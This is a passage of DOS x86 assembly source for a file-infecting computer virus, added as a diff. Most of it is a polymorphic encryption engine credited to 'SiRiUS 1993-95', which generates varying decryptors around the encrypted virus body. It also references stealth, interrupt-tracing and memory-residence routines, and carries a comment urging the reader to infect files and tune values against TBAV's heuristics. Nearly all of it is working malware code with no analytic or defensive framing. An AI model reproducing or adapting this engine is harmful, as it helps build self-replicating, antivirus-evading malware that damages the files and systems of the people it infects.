+        Rout_1  Routine <ofs GetSetHandleDateTime , GetSetHandleDateTime_End  - GetSetHandleDateTime , 0>
+        Rout_2  Routine <ofs Get_SFT              , Get_SFT_End               - Get_SFT              , 0>
+        Rout_3  Routine <ofs TestIfDoStealth      , TestIfDoStealth_End       - TestIfDoStealth      , 0>
+        Rout_4  Routine <ofs CheckExtensionForExec, CheckExtensionForExec_End - CheckExtensionForExec, 0>
+        Rout_5  Routine <ofs DosDir               , DosDir_End                - DosDir               , 0>
+        Rout_6  Routine <ofs DosFindFile          , DosFindFile_End           - DosFindFile          , 0>
+        Rout_7  Routine <ofs DisplayCopyright     , DisplayCopyright_End      - DisplayCopyright     , 0>
+        Rout_8  Routine <ofs SeekToEOF            , SeekToEOF_End             - SeekToEOF            , 0>
+        Rout_9  Routine <ofs Trace_Interrupts     , Trace_Interrupts_End      - Trace_Interrupts     , 0>
+        Rout_10 Routine <ofs WriteToHandle        , WriteToHandle_End         - WriteToHandle        , 0>
+        Rout_11 Routine <ofs ScanMCB              , ScanMCB_End               - ScanMCB              , 0>
+Use_Routine_Table_End   equ     $
+;----------------------------------------------------------------------------
+
+
+
+
+
+
+;==[ include file: SPM33.ASM ]===============================================
+
+
+
+
+
+; +------------------------------------------------------------------------+
+; |                                                                        |
+; |  SIRIUS POLYMORPHIC MODULE [SPM]  (shortened)        by SiRiUS 1993-95 |
+; |                                                                        |
+; +------------------------------------------------------------------------+
+
+
+; Maximal encryption loop length is 127 bytes
+; Must be less than (DI - adjust_EncInstruction)
+
+; !
+; Try to VARY the values below, infect files, and test with TBAV's
+; heuristcs behaviour.
+; !
+
+
+cmt #
+-- not needed because the "garbler" is deleted
+GarbLoopMaxLen          =      0   ; 0-30
+GarblerLoopsPerCall     =      0   ; 0-5
+#
+
+
+;============================================================================
+;                               START
+;============================================================================
+
+; Signature
+        db      "[SPM 93/94/95]",0
+
+SPM proc near
+        cld
+        push    cs
+        pop     es
+        push    cs
+        pop     ds
+        call    Polymorphism
+        ret
+SPM endp
+
+
+
+
+CMT *
+
+ SPM-DECRYPTOR structure:
+ ------------------------
+
+Enc_Buffer:
+        mov Index reg,xxxx
+                      ^---------- adjust_IndexRegValue
+        mov Enc reg,xxxx
+        <mov Counter reg,xxxx>    garbled
+        cs: xor [Index reg],Enc reg
+        ^------------------------ adjust_EncInstruction
+        ...
+        ...
+        jnz xx
+            ^-------------------- adjust_JumpArgument
+        nop
+        <------------------------ adjust_DecryptorEnd
+
+        <decrypted>
+        <decrypted>
+*
+
+
+;----------------------------------------------------------------------------
+;  Processes:    n*(PUSH Rw)
+;        ..or..
+;                n*(POP Rw)
+;----------------------------------------------------------------------------
+GarbType_PART_MULT_PUSHPOP_RW proc near
+
+        ret
+
+        cmp     FL_PUSHPOP_Direction,1
+        jz      Dir_is_POP
+
+Dir_is_PUSH:
+        mov     ax,1                            ; change it!! 1-16 ...
+        call    Random
+        inc     ax              ;AX:=1..8
+        mov     PUSHPOP_Counter,ax
+        mov     cx,ax
+GT_PMP_1:
+        push    cx
+        call    Get_AReg        ; Does: PUSH Rw
+        add     al,PUSH_Rw
+        stosb
+        pop     cx
+        loop    GT_PMP_1
+
+        mov     FL_PUSHPOP_Direction,1
+        ret
+
+Dir_is_POP:
+        mov     cx,PUSHPOP_Counter
+GT_PMP_2:
+        push    cx
+        call    Get_GReg
+        add     al,POP_Rw
+        stosb
+        pop     cx
+        loop    GT_PMP_2
+
+        mov     FL_PUSHPOP_Direction,0
+        ret
+GarbType_PART_MULT_PUSHPOP_RW endp
+
+
+
+;============================================================================
+
+POLYMORPHISM proc near
+
+; Init some internal SPM-flags
+        mov     FL_PUSHPOP_Direction,0
+
+; Randomize program start conditions
+        call    Randomize
+
+; Reset registers (randomly)
+        call    ClearRegisters
+
+; Define encryption registers
+        mov     di,ofs DefineRegisters
+
+        call    DefineFreeIndexReg      ; Index
+        stosb
+        call    DefineFreeCommonReg     ; Counter
+        stosb
+        call    DefineFreeCommonReg     ; Key
+        stosb
+
+; Define garbler word registers
+
+        call    DefineFreeCommonReg
+        stosb
+        call    DefineFreeCommonReg
+        stosb
+        call    DefineFreeCommonReg
+        stosb
+        call    DefineFreeCommonReg
+        stosb
+;============================================================================
+
+
+
+;----------------------------------------------------------------------------
+;  Polymorphic decryptor construction
+;----------------------------------------------------------------------------
+
+; DI points to the offset where the decryptor is built
+
+        mov     di,ofs Enc_Buffer
+        mov     adjust_EncInstruction,di
+
+
+; Begin creating the decryptor ----------------------------------------------
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+;----------------------------------------------------------------------------
+; Load Index-Reg
+;----------------------------------------------------------------------------
+        mov     al,MOV_RwDw
+        add     al,Index_Reg
+        stosb
+        mov     adjust_IndexRegValue,di         ; save location
+        stosw
+;----------------------------------------------------------------------------
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+;============================================================================
+; Load Key-Reg
+;============================================================================
+
+Op_MOV_ByteReg_Byte = 0B0h
+
+        cmp     Key_Reg,__BX            ;== 3
+        jbe     Is_FirstFourReg
+
+        mov     al,MOV_RwDw
+        add     al,Key_Reg
+        stosb
+        call    Full_Random
+        stosw
+        mov     EncDX,ax                ; save key
+        jmp     Load_Key_Done
+
+Is_FirstFourReg:                        ;Make: MOV AL,xx  MOV AH,xx
+        call    Full_Random             ;AX:=key
+        mov     EncDX,ax                ; save key
+        xchg    ax,dx                   ;DX:=hey
+        mov     al,Op_MOV_ByteReg_Byte  
+        add     al,Key_Reg
+        mov     ah,dl
+        stosw                           ;lo byte
+
+;        push    dx
+;        call    GarbType_1BYTE
+;        pop     dx
+
+        mov     al,Key_Reg
+        add     al,Op_MOV_ByteReg_Byte +4
+        mov     ah,dh
+        stosw                           ;hi byte
+
+Load_Key_Done:
+;============================================================================
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+;============================================================================
+; Load Counter-Reg
+;============================================================================
+        mov     al,Counter_Reg
+        mov     dx,(Body_VLength/2) +1
+        call    MutatedRegMove
+;============================================================================
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+;============================================================================
+; Construct encryption
+;============================================================================
+        cmp     FileType_Byte,File_Mark_COM
+        jz      Camouf_COM
+
+Camouf_EXE:
+;----------------------------------------------------------------------------
+; Nur fÅr 'camouflage' !
+        mov     si,ofs Camouf
+        mov     ax,(EO_Camouf-Camouf)/2
+        call    Random
+        shl     ax,1         ; AX:=AX*2
+        add     si,ax
+        movsw
+;----------------------------------------------------------------------------
+
+        mov     adjust_EncInstruction,di        ; Save location
+        mov     al,2eh                          ; = 'CS:'
+        stosb
+        jmp     Camouf_Exit
+
+Camouf_COM:
+;----------------------------------------------------------------------------
+; Nur fÅr 'camouflage' !
+        mov     si,ofs Camouf_1B
+        mov     ax,(Camouf_1B_End - Camouf_1B)/2
+        call    Random
+        shl     ax,1         ; AX:=AX*2
+        add     si,ax
+        movsw
+;----------------------------------------------------------------------------
+
+        mov     adjust_EncInstruction,di        ; Save location
+
+Camouf_Exit:
+
+; Load the decryption-method into the decryptor and the encryption-method
+; into the encryption-procedure, supported methods are: XOR/ADD/SUB
+
+        mov     si,ofs EncMethodTable
+        mov     ax,(EncMethodTableEnd-EncMethodTable) /2
+        call    Random
+        shl     ax,1
+        add     si,ax
+        lodsw                           ; load dec/enc pair
+        stosb                           ; store dec-byte
+        mov     CryptMethod,ah          ; store enc-byte
+
+; Referenz:
+        mov     al,Key_Reg
+        mov     ah,8
+        mul     ah                      ; AL:=8*AL
+
+        cmp     Index_Reg,__SI
+        jne     is_DI
+        add     al,__PTR_SI
+is_DI:  cmp     Index_Reg,__DI
+        jne     is_BX
+        add     al,__PTR_DI
+is_BX:  cmp     Index_Reg,__BX
+        jne     ref_ok
+        add     al,__PTR_BX
+ref_ok: stosb
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+
+;============================================================================
+; Key-change
+;============================================================================
+
+;  Processes:      SUB Key_Reg,xxxx   v   ADD Key_Reg,xxxx
+
+        ADD_RwRw_       =       05h
+        SUB_RwRw_       =       2dh
+        TWOBYTE_PREFIX  =       81h
+        REG_BASIS       =       0c0h-5  ; correction
+
+        xor     ax,ax
+        cmp     Key_Reg,__AX
+        jz      KeyAX
+
+        mov     al,TWOBYTE_PREFIX
+        stosb
+        mov     al,REG_BASIS
+
+KeyAX:  call    OneInTwo
+        jz      DoSub
+        add     al,ADD_RwRw_
+        mov     ChKeyMethod,ADD_RwRw_
+        jmp     short DoEnd
+
+DoSub:  add     al,SUB_RwRw_
+        mov     ChKeyMethod,SUB_RwRw_
+
+Doend:  add     al,Key_Reg
+        stosb
+        call    Full_Random
+        stosw
+        mov     ChKeyValue,ax
+;----------------------------------------------------------------------------
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+
+
+;============================================================================
+; Increment Index-Register by 2
+;============================================================================
+
+; INC method
+
+        call    OneInTwo
+        jz      Add_Two
+
+        mov     al,INC_Rw
+        add     al,Index_Reg
+        stosb
+        stosb
+        jmp     Add_Done
+
+; ADD/SUB method
+
+Add_Two:
+        cmp     Index_Reg,__AX
+        jz      A_KeyAX
+
+        mov     al,83h
+        stosb
+        mov     al,0C0h
+        add     al,Index_Reg
+        stosb
+        mov     al,2
+        stosb
+        jmp     Add_Done
+
+A_KeyAX:
+        mov     al,05h
+        stosb
+        mov     ax,2
+        stosw
+
+
+Add_Done:
+
+        call    GarbType_PART_MULT_PUSHPOP_RW
+        call    GarbType_PART_MULT_PUSHPOP_RW
+
+;============================================================================
+; DEcide if use LOOP or JNZ
+; if CX then LOOP
+;============================================================================
+
+        cmp     Counter_Reg,__CX
+        jnz     DoJNZ
+
+
+; Ein LOOP wird verwendet
+
+        Opcode_LOOP     =       0E2h
+
+        mov     al,Opcode_LOOP
+        stosb
+        mov     adjust_JumpArgument,di
+        stosb
+
+        jmp     short GenLoopEnd
+
+; Ein JNZ wird verwendet
+
+; Konstruiere die Dekrementierung des ZÑhler-Register
+
+DoJNZ:  mov     al,DEC_Rw
+        add     al,Counter_Reg
+        stosb
+
+;----------------------------------------------------------------------------
+; Konstruiere die Abbruchbedingung
+;
+; Processes:    CMP RW,0   v   OR/AND/TEST RW
+;               
+;               "CMP RW,00"  is 1 byte: 83
+;                               2 byte: F8+RW
+;                               3 byte: 00
+;----------------------------------------------------------------------------
+
+        call    OneInTwo
+        jz      Soap_2
+
+Soap_1:
+        cmp     Counter_Reg,__AX
+        jz      soa_skip_1
+
+        mov     al,ByteRegPrefix
+        stosb
+soa_skip_1:
+        mov     si,ofs Inst_Reg_Zero
+        mov     ax,Inst_Reg_Zero_End - Inst_Reg_Zero
+        call    Random
+        add     si,ax
+        lodsb
+        add     al,Counter_Reg
+
+        cmp     Counter_Reg,__AX
+        jnz     soa_skip_2
+        sub     al,0BBh
+        stosb
+        xor     ax,ax
+        stosw
+        jmp     EndSoap
+
+soa_skip_2:
+        stosb
+
+        mov     al,0
+        stosb
+        jmp     short EndSoap
+
+Soap_2: mov     si,ofs GarblerInstCheckZero
+        mov     ax,GarblerInstCheckZeroEnd - GarblerInstCheckZero
+        call    Random
+        add     si,ax
+        movsb
+        mov     al,Counter_Reg
+        mov     ah,9
+        mul     ah
+        add     al,Rw1Rw1_Cor
+        stosb
+EndSoap:
+
+; Construct a JNZ / Garbler must not be called here !
+
+        mov     al,74h                  ; = JZ Ende
+        stosb
+
+        mov     ax,1
+        call    Random
+        inc     ax
+        push    ax
+        add     al,2
+        stosb
+
+        pop     cx
+uwe:    call    GarbType_1BYTE
+        loop    uwe
+
+nCXCnt: mov     al,0EBh            ; = JMP
+        stosb
+        mov     adjust_JumpArgument,di
+        stosb
+
+GenLoopEnd:
+        mov     adjust_DecryptorEnd,di
+
+
+; Patch the decryptor to fit all relatives
+
+; calculate and set Enc-Start-argument
+
+        mov     ax,adjust_DecryptorEnd
+        sub     ax,ofs Enc_buffer
+        add     ax,Victim_Len
+
+
+;----------------------------------------------------------------------------
+        dec     ax
+        dec     ax
+;----------------------------------------------------------------------------
+
+        cmp     FileType_Byte,File_Mark_EXE
+
+        jz      ItsExe
+        add     ah,1             ; EP von .COMs ist bei 100h ( =ADD AX,100h )
+ItsExe: mov     di,adjust_IndexRegValue
+        stosw                    ; = mov     [di],ax
+
+; Calculate and set loop-Argument
+
+        mov      ax,adjust_JumpArgument
+        sub      ax,adjust_EncInstruction
+        not      ax
+        mov      di,adjust_JumpArgument
+        stosb                    ; = mov      Byte Ptr [di],al
+
+; Copy virus-body to buffer
+
+        mov      si,offset Encrypted_code
+        mov      di,adjust_DecryptorEnd  ; Ofs des nÑchsten freien Byte - direkt
+                                         ; dem Decryptor folgend
+        mov      cx,Body_VLength
+        rep      movsb
+
+; Encrypt virus-body-copy ( header wont be encrypted )
+
+        call    Encrypt
+
+; Zero the puffer-end
+
+        mov     di,si
+        mov     cx,80
+
+IF NOT FL_RANDOM_FILL
+        mov     al,'-'
+ENDIF
+
+ZeroBufferEnd:
+
+IF FL_RANDOM_FILL
+        call    Full_Random
+ENDIF
+
+        stosb
+        loop    ZeroBufferEnd
+        ret
+POLYMORPHISM endp
+;============================================================================
+
+
+
+;----------------------------------------------------------------------------
+;  Encryption routine. Encrypts the virus-body code
+;----------------------------------------------------------------------------
+Encrypt proc near
+        clc
+        mov     si,adjust_DecryptorEnd
+        mov     cx,(Body_VLength/2) +1
+
+        mov     ax,0000
+        ORG     $-2
+EncDX   dw      0000
+
+CryptLoop:
+
+;----------------------------------------------------------------------------
+ChKeyMethod     db  00          ; = Add/Sub AX,xxxx
+ChKeyValue      dw  0000        ; = xxxx
+;----------------------------------------------------------------------------
+
+        db      2Eh             ; = Assume cs:
+CryptMethod     db  00          ; = <CryptMethod> Word Ptr CS:[SI],AX
+        db      04h             
+
+        inc     si
+        inc     si
+        loop    CryptLoop
+        ret
+Encrypt endp
+
+
+;============================================================================
+
+cmt #
+GarblerType     equ     $
+                dw      ofs GarbType_JMP_COND
+                dw      ofs GarbType_PUSHPOP_RW
+                dw      ofs GarbType_1BYTE
+GarblerTypeEnd  equ     $
+#
+
+
+ClearRegisters proc near
+        mov     di,ofs DefineRegisters
+        mov     cx,DefineRegistersEnd - DefineRegisters
+        mov     al,Free
+        rep     stosb
+        ret
+ClearRegisters endp
+
+
+DefineFreeCommonReg proc near
+        push    di
+othCR:  mov     si,ofs RegistersAll
+        mov     ax,RegistersEnd - RegistersAll
+        call    Random
+        add     si,ax
+        lodsb                                   ;AL:=[SI] / INC SI
+        mov     di,ofs DefineRegisters
+        mov     cx,DefineRegistersEnd - DefineRegisters
+nxtCR:  scasb                                   ;cmp AL,[DI] / INC DI
+        jz      othCR
+        loop    nxtCR
+        pop     di
+        ret
+DefineFreeCommonReg endp
+
+
+DefineFreeIndexReg proc near
+        push    di
+othIR:  mov     si,ofs RegistersIndex
+        mov     ax,RegistersEnd - RegistersIndex
+        call    Random
+        add     si,ax
+        lodsb
+        mov     di,ofs DefineRegisters
+        mov     cx,DefineRegistersEnd - DefineRegisters
+nxtIR:  scasb
+        jz      othIR
+        loop    nxtIR
+        pop     di
+        ret
+DefineFreeIndexReg endp
+;============================================================================
+
+
+
+cmt #
+Garbler proc    near
+        mov     cx,GarblerLoopsPerCall
+        or      cx,0
+        jz      Quit_Gb
+Gb_Cycle:
+        push    cx
+
+; Test if enc-loop not to large
+        mov     ax,di
+        sub     ax,adjust_EncInstruction
+        cmp     ax,GarbLoopMaxLen
+        jae     Term_Gb
+
+        mov     si,ofs GarblerType
+        mov     ax,( GarblerTypeEnd - GarblerType ) / 2
+        call    Random
+        shl     ax,1                    ; AX:=AX*2
+        add     si,ax
+        call    [si]
+
+        pop     cx
+        loop    Gb_Cycle
+        ret
+Term_Gb:
+        pop     cx
+Quit_Gb:
+        ret
+Garbler endp
+#
+
+
+;============================================================================
+; BX must be NOT used to store values !
+; It is used by Get_XReg procedures ! (use DX instead!)
+;============================================================================
+
+
+GarbType_1BYTE proc near
+        mov     si,ofs One_Byte_Inst
+        mov     ax,EO_One_Byte_Inst - One_Byte_Inst
+        call    Random
+        add     si,ax
+        movsb
+        ret
+GarbType_1BYTE endp
+
+cmt #
+;----------------------------------;
+;  Processes:    PUSH Rw           ;
+;                <other code>      ;
+;                POP Rw            ;
+;----------------------------------;
+GarbType_PUSHPOP_RW proc near
+        call    Get_AReg        ; Does: PUSH Rw
+        add     al,PUSH_Rw
+        stosb
+;;        call    Garbler         ; Recursive call !
+        call    Get_GReg
+        add     al,POP_Rw
+        stosb
+        ret
+GarbType_PUSHPOP_RW endp
+
+;------------------------------------------------;
+; Processes:  "Jxx SHORT $+1..3"  (cond. jump)   ;
+;------------------------------------------------;
+GarbType_JMP_COND proc near
+        mov     ax,16
+        call    Random
+        add     al,70h          ; Opcodes: 70h-7fh are cond. short jumps
+        stosb
+        push    di              ; Save patch ofs
+        stosb                   ; Here is the argument, which to patch later
+
+;;        call    Garbler         ; Recursive call !
+
+        pop     ax              ; = Patch ofs
+        push    di              ; Save current ofs
+        push    ax              ; Save patch ofs
+        sub     di,ax
+        mov     ax,di
+        pop     di              ; Restore patch ofs
+        dec     ax              ; Needed correction
+        stosb                   ; Patch it !
+        pop     di              ; Pop current ofs
+        ret
+GarbType_JMP_COND endp
+#
+
+
+cmt #
+; Does: LEA AX,[BX+SI]
+
+        Opcode_LEA_Rw_Ptr       =       8dh
+
+GarbType_LEA_RW_PTR proc near
+        call    GarblerAssumeSeg
+        mov     al,Opcode_LEA_Rw_Ptr
+        stosb
+
+        mov     si, ofs PtrRegisters
+        mov     ax, PtrRegistersEnd - PtrRegisters
+        call    Random
+        add     si,ax
+        lodsb
+        mov     dl,al
+        call    Get_GReg
+        mov     ah,8
+        mul     ah
+        add     al,dl
+
+        call    OneInThree
+        jz      leaBytely
+        jc      leaWordly
+
+LeaByteNorWord:
+        stosb
+        ret
+
+LeaBytely:
+        add     al,40h
+        stosb
+        call    Full_Random
+        stosb
+        ret
+
+LeaWordly:
+        add     al,80h
+        stosb
+        call    Full_Random
+        stosw
+        ret
+GarbType_LEA_RW_PTR endp
+#
+
+
+; Get a garbler register
+
+Get_GReg proc near
+        mov     bx,ofs GarblerRegs
+        mov     ax,GarblerRegsEnd - GarblerRegs
+        call    Random
+        xlatb
+        ret
+Get_GReg endp
+
+
+; Get one register (decryptor+garbler)
+
+Get_AReg proc near
+        mov     bx,ofs DefineRegisters
+        mov     ax,DefineRegistersEnd - DefineRegisters
+        call    Random
+        xlatb
+        ret
+Get_AReg endp
+
+
+
+Get_GAReg proc near
+        cmp     LastOpcode,CMP__
+        jz      AReg
+        cmp     LastOpcode,TEST__
+        jz      AReg
+        call    Get_GReg
+        ret
+Areg:   call    Get_AReg
+        ret
+Get_GAReg endp
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+;  Gives you a segment prefix
+;----------------------------------------------------------------------------
+GarblerAssumeSeg proc near
+        call    OneInTwo
+        jnz     gasEnd
+        mov     si,ofs GarblerAssumeSegTab
+        mov     ax,GarblerAssumeSegTabEnd - GarblerAssumeSegTab
+        call    Random
+        add     si,ax
+        movsb
+gasEnd: ret
+GarblerAssumeSeg endp
+
+
+
+        ADD_AllRwDw     = 0C081h        ; e.g. ADD CX,1234h
+        SUB_AllRwDw     = 0E881h
+        XOR_AllRwDw     = 0F081h
+
+;----------------------------------------------------;
+;   a.) MOV Reg, Wert                                ;
+;   b.) MOV Reg, Wert-const.     / ADD Reg, const.   ;
+;   c.) MOV Reg, Wert+const.     / SUB Reg, const.   ;
+;   d.) MOV Reg, Wert xor const. / XOR reg, const.   ;
+;   e.) LEA Reg, [Wert]                              ;
+;----------------------------------------------------;
+MutatedRegMove PROC NEAR
+        mov     bl,al
+        push    ax
+
+        cmp     al,__AX
+        jz      mrmMethod_A
+
+        call    Full_Random
+
+        cmp     al,255*4/5
+        jmp      mrmMethod_E
+        cmp     al,255*3/5
+        ja      mrmMethod_D
+        cmp     al,255*2/5
+        ja      mrmMethod_C
+        cmp     al,255*1/5
+        ja      mrmMethod_B
+
+mrmMethod_A:
+        pop     ax
+        add     al,MOV_RwDw
+        stosb
+        xchg    ax,dx
+        stosw
+        ret
+
+mrmMethod_B:
+        pop     ax
+        add     al,MOV_RwDw
+        stosb
+        call    Full_Random
+        stosw
+
+        pusha
+;        call    Garbler
+        popa
+
+        push    ax              ; = const.
+        mov     ax,ADD_AllRwDw
+        add     ah,bl           ; BL=Reg.
+        stosw
+        pop     ax
+        sub     dx,ax
+        xchg    ax,dx
+        stosw
+        ret
+
+mrmMethod_C:
+        pop     ax
+        add     al,MOV_RwDw
+        stosb
+        call    Full_Random
+        stosw
+
+        pusha
+;;        call    Garbler
+        popa
+
+        push    ax              ; = const.
+        mov     ax,SUB_AllRwDw
+        add     ah,bl           ; BL=Reg.
+        stosw
+        pop     ax
+        sub     ax,dx
+        stosw
+        ret
+
+mrmMethod_D:
+        pop     ax
+        add     al,MOV_RwDw
+        stosb
+        call    Full_Random
+        stosw
+
+        pusha
+;;        call    Garbler
+        popa
+
+        push    ax              ; = const.
+        mov     ax,XOR_AllRwDw
+        add     ah,bl           ; BL=Reg.
+        stosw
+        pop     ax
+        xor     ax,dx
+        stosw
+        ret
+
+mrmMethod_E:
+        mov     al,08dh ; LEA reg,[word] == '8D | (reg*8)+6 | word'
+        stosb
+
+        pop     ax
+        shl     al,3    ; AL:=AL*8
+        add     al,6
+        stosb
+
+        mov     ax,dx
+        stosw
+        ret
+
+MutatedRegMove ENDP
+
+
+;----------------------------------------------------------------------------
+;  50 %  ==> ZF   - jz
+;  50 %  ==> NZ   - jnz
+;----------------------------------------------------------------------------
+OneInTwo        proc    near
+        push    ax
+        call    Full_Random
+        test    al,1
+        pop     ax
+        ret
+OneInTwo        endp
+
+
+;----------------------------------------------------------------------------
+;  33 %  ==> ZR    - jz
+;  33 %  ==> CY    - jc
+;  34 %  ==> NZ+NC - jnz AND jnc
+;----------------------------------------------------------------------------
+OneInThree      proc    near
+        push    ax
+        call    Full_Random
+        cmp     al,(255/3)*1
+        jae     Is_2nd_or_3rd
+
+Is_1st: cmp     al,al           ; --> ZR
+        clc                     ;     NC
+        pop     ax
+        ret
+
+Is_2nd_or_3rd:
+        cmp     al,(255/3)*2
+        jb      Is_2nd          ; --> CY,NZ
+
+Is_3rd: mov     ax,1
+        cmp     al,ah           ; --> NC,NZ
+        pop     ax
+        ret
+
+Is_2nd: pop     ax
+        ret
+OneInThree      endp
+
+
+
+;----------------------------------------------------------------------------
+; Gives a random number between 0-65535 in AX
+;----------------------------------------------------------------------------
+Full_Random     proc near
+        mov     ax,-2
+        call    Random
+        ret
+Full_Random     endp
+
+
+DefineRegisters         equ     $
+DecryptorRegs           equ     $
+        Index_Reg       db      __SI
+        Counter_Reg     db      __AX
+        Key_Reg         db      __DX
+DecryptorRegsEnd        equ     $
+GarblerRegs             equ     $
+        GarblerReg1     db      __BX
+        GarblerReg2     db      __CX
+        GarblerReg3     db      __DI
+        GarblerReg4     db      __BP
+GarblerRegsEnd          equ     $
+DefineRegistersEnd      equ     $
+
+
+
+GarblerByteRegisters    equ     $
+        ByteReg1        db      -1
+        ByteReg2        db      -1
+        ByteReg3        db      -1
+        ByteReg4        db      -1
+        ByteReg5        db      -1
+        ByteReg6        db      -1
+        ByteReg7        db      -1
+        ByteReg8        db      -1
+GarblerByteRegistersEnd equ     $
+
+
+
+RegistersAll            equ     $
+        _AX             db      0
+        _CX             db      1
+        _DX             db      2
+        _BP             db      5
+RegistersIndex          equ     $
+        _BX             db      3
+        _SI             db      6
+        _DI             db      7
+RegistersEnd            equ     $
+
+
+One_Byte_Inst           equ     $
+                        clc
+                        stc
+                        cmc
+                        cld
+                        nop
+EO_One_Byte_Inst        equ     $
+
+
+        MOV__           =       89h
+        CMP__           =       39h
+        ADC__           =       11h
+        ADD__           =       01h
+        SUB__           =       29h
+        SBB__           =       19h
+        XOR__           =       31h
+        OR__            =       09h
+        AND__           =       21h
+        TEST__          =       85h  ; "TEST RW,[bx+di]" is not legal !
+
+
+GarblerInstCheckZero    equ     $
+        OR_cz           db      09h     ; OR AX,AX
+        AND_cz          db      21h
+        TEST_cz         db      85h
+GarblerInstCheckZeroEnd equ     $
+
+EncMethodTable          equ     $       ; <Enc-Method>, <Dec-Method>
+        db              31h,31h         ; XOR, XOR
+        db              01h,29h         ; ADD, SUB
+        db              29h,01h         ; SUB, ADD
+EncMethodTableEnd       equ     $
+
+
+GarblerAssumeSegTab     equ     $
+        ASSUME_CS       db      2eh
+        ASSUME_DS       db      3eh
+        ASSUME_ES       db      26h
+        ASSUME_SS       db      36h
+GarblerAssumeSegTabEnd  equ     $
+
+
+PtrRegisters            equ     $
+        PTR_BXSI        db      0
+        PTR_BXDI        db      1
+        PTR_BPSI        db      2
+        PTR_BPDI        db      3
+        PTR_SI          db      4
+        PTR_DI          db      5
+        PTR_BX          db      7
+PtrRegistersEnd         equ     $
+
+Camouf  equ     $
+        db      080h, 3Eh       ; cmp  [DW]    ,DB
+        db      083h, 3Eh       ; cmp  [DW]    ,DB word ptr
+        db      0F6h, 06h       ; test [DW]    ,DB
+        db      080h,0B8h       ; cmp  [PTR+DW],DB
+        db      083h,0B8h       ; cmp  [PTR+DW],DB word ptr
+        db      081h, 78h       ; cmp  [PTR+DB],DW
+        db      0F6h, 80h       ; test [PTR+DW],DB
+        db      0F7h, 40h       ; test [PTR+DB],DW
+EO_Camouf       equ             $
+
+
+Camouf_1B       equ $
+        db      039h,00Eh
+        db      039h,01Eh
+        db      0F7h,0C1h
+        db      085h,006h
+        db      085h,084h
+Camouf_1B_End   equ $
+
+
+Inst_Reg_Zero           equ     $
+        ADD_RegBase     db       0C0h
+        SUB_RegBase     db       0E8h
+        CMP_RegBase     db       0F8h
+Inst_Reg_Zero_End       equ     $
+
+        __AX            =       0
+        __CX            =       1
+        __DX            =       2
+        __BX            =       3
+        __BP            =       5
+        __SI            =       6
+        __DI            =       7
+
+        __AL            =       0
+        __CL            =       1
+        __DL            =       2
+        __BL            =       3
+        __AH            =       4
+        __CH            =       5
+        __DH            =       6
+        __BH            =       7
+
+        __PTR_BXSI      =       0
+        __PTR_BXDI      =       1
+        __PTR_BPSI      =       2
+        __PTR_BPDI      =       3
+        __PTR_SI        =       4
+        __PTR_DI        =       5
+        __PTR_BX        =       7
+
+        ByteRegPrefix   =       83h
+        Free            =       -1
+
+        CMP_RwRw_       =       39h
+        TEST_RwRw_      =       85h
+
+        INDIRECT        =       0FFh
+        PUSH_Rw         =       50h
+        POP_Rw          =       58h
+        PUSH_Dw         =       68h
+        MOV_RwDw        =       0b8h
+        MOV_RwRw_       =       89h    ; mov Rb,xx ist 2-Bytes lang !
+
+        XOR_PtrRwRw     =       31h
+        XOR_PtrRwRw_Cor =       04h
+        Rw1Rw1_Cor      =       0c0h
+
+        INC_Rw          =       40h
+        DEC_Rw          =       48h
+
+
+
+;----------------------------------------------------------------------------
+; Inits Init_Nr from timer
+;----------------------------------------------------------------------------
+Randomize       proc near
+        push    ds
+        push    0
+        pop     ds
+        mov     ax,ds:[46ch]            ; = timer cell
+        pop     ds
+        mov     cs:InitNr,ax
+        ret
+Randomize       endp
+
+
+
+;----------------------------------------------------------------------------
+;  RNG  ( = Random Numers Generator )
+;  Gives you a pseudo-random number in AX where 0 >= number > AX
+;----------------------------------------------------------------------------
+RANDOM proc near
+        push    bx cx dx
+        mov     bx,cs:InitNr
+        mov     cl,cs:Cycle
+        rol     bx,cl
+        rol     bx,1
+        inc     bx
+        rol     bx,1
+        rol     bx,1
+        mov     cs:InitNr,bx
+        mul     bx
+        xchg    ax,dx
+        add     cs:Cycle,dl
+        pop     dx cx bx
+        ret
+Cycle   db      0
+InitNr  dw      0
+RANDOM endp
+
+
+adjust_IndexRegValue    dw      ?
+adjust_EncInstruction   dw      ?
+adjust_JumpArgument     dw      ?
+adjust_DecryptorEnd     dw      ?
+
+LastOpcode              db      ?
+FL_PUSHPOP_Direction    db      ?
+PUSHPOP_Counter         dw      ?
+
+
+;----------------------------------------------------------------------------
+; Constructs a MOV xH,byte1 and MOV xL,byte2
+;
+; Args: AL = Register
+;       DX = Word-value
+;
+; If Register in [SI,DI,BP] then constructs a MOV xX,Word
+;----------------------------------------------------------------------------
+MOV_RW__To_MOV_Rb proc near
+        cmp     al,__BX            ;== 3
+        jbe     p_In_FirstFourReg
+
+        add     al,MOV_RwDw
+        stosb
+        mov     ax,dx
+        stosw
+        jmp     p_Load_Key_Done
+
+p_In_FirstFourReg:                      ;Make: MOV AL,xx  MOV AH,xx
+        push    ax
+        add     al,Op_MOV_ByteReg_Byte
+        mov     ah,dl
+        stosw                           ;lo byte
+        pop     ax
+
+        add     al,Op_MOV_ByteReg_Byte +4
+        mov     ah,dh
+        stosw                           ;hi byte
+
+p_Load_Key_Done:
+        ret
+MOV_RW__To_MOV_Rb endp
+
+;==============================================[ End of include SPM34.ASM ]==
+
+
+
+End_Enc_Code            equ     $
+
+
+;----------------------------------------------------------------------------
+
+; Variables:
+
+DummyWord               dw      ?
+DriveNr                 db      ?
+
+TracerTmp_Seg           dw      ?
+TracerTmp_Ofs           dw      ?
+
+CallStatus              db      0
+VirModus                db      0
+TimerCell_1             dw      0
+TimerCell_2             dw      0
+Victim_Len              dw      0
+Handle                  dw      0
+AttackAV                db      0
+
+NamePtr                 equ     $
+NameDX                  dw      0
+NameDS                  dw      0
+
+Old_Time                dw      0
+Old_Date                dw      0
+Old_Attribs             db      0
+
+Mem_Strat               dw      0
+UMB_Strat               db      0
+
+File_SizeLo             dw      0
+File_SizeHi             dw      0
+
+HimemEP_ofs             dw      0
+HimemEP_seg             dw      0
+
+Alloc_Status            db      0
+OldPSP                  dw      0
+FirstMCB                dw      0
+
